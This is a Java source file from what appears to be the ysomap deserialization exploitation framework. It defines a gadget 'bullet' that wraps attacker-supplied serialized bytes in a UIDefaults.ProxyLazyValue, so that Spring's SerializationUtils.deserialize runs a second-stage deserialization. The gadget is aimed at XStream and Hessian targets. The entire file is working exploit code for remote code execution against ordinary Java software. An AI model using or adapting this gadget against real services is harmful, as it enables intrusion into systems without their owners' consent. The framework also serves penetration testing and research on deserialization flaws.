package ysomap.bullets.jdk;

import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.core.util.ReflectionHelper;

import javax.swing.*;

/**
 * @author wh1t3P1g
 * @since 2021/1/4
 */
@Bullets
@Dependencies({"jdk"})
@Details("依赖spring框架触发二次反序列化")
@Targets({Targets.XSTREAM, Targets.HESSIAN})
@Authors({Authors.WH1T3P1G})
public class ProxyLazyValueWithDSBullet implements Bullet<UIDefaults.ProxyLazyValue> {

    @NotNull
    @Require(name = "serialized", detail = "序列化后的byte数组，非console配置，请勿用")
    public byte[] serialized;

    @Override
    public UIDefaults.ProxyLazyValue getObject() throws Exception {
        String classname = "org.springframework.util.SerializationUtils";
        String methodName = "deserialize";
        Object[] evilargs = new Object[]{serialized};
        return new UIDefaults.ProxyLazyValue(classname, methodName, evilargs);
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new ProxyLazyValueWithDSBullet();
        ReflectionHelper.set(bullet, "serialized", args[0]);
        return bullet;
    }
}
